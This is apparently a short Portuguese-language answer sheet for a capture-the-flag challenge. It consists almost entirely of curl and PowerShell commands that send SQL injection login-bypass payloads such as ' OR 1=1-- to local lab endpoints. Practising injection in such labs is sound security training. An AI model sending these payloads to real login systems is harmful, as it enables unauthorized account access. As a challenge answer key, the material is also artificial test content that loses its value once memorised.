CURL PARA ATACAR O CÓDIGO



curl -X POST http://127.0.0.1:5000/api/login -H "Content-Type: application/json" -d "{\\"email\\": \\"' OR '1'='1'--\\", \\"password\\": \\"qualquer\_coisa\\"}"



RESPOSTA DESAFIO 1 CAPTURE THE FLAG



bash

curl -X POST http://127.0.0.1:5050/ctf/api/login -H "Content-Type: application/json" -d '{"username": "admin'\\''--", "password": "123"}'





cmd

curl -X POST http://localhost:5050/ctf/api/login -H "Content-Type: application/json" -d "{\\"username\\": \\"admin ' OR 1=1--\\", \\"password\\": \\"x\\"}"





powershell



$body = @{ username = "admin ' OR 1=1--"; password = "x" } | ConvertTo-Json

Invoke-RestMethod -Method Post -Uri "http://localhost:5050/ctf/api/login" -ContentType "application/json" -Body $body





no poweshell no método antigo



**curl.exe -X POST http://localhost:5050/ctf/api/login -H "Content-Type: application/json" -d "{\\`"username\\`": \\`"admin ' OR 1=1--\\`", \\`"password\\`": \\`"x\\`"}"**







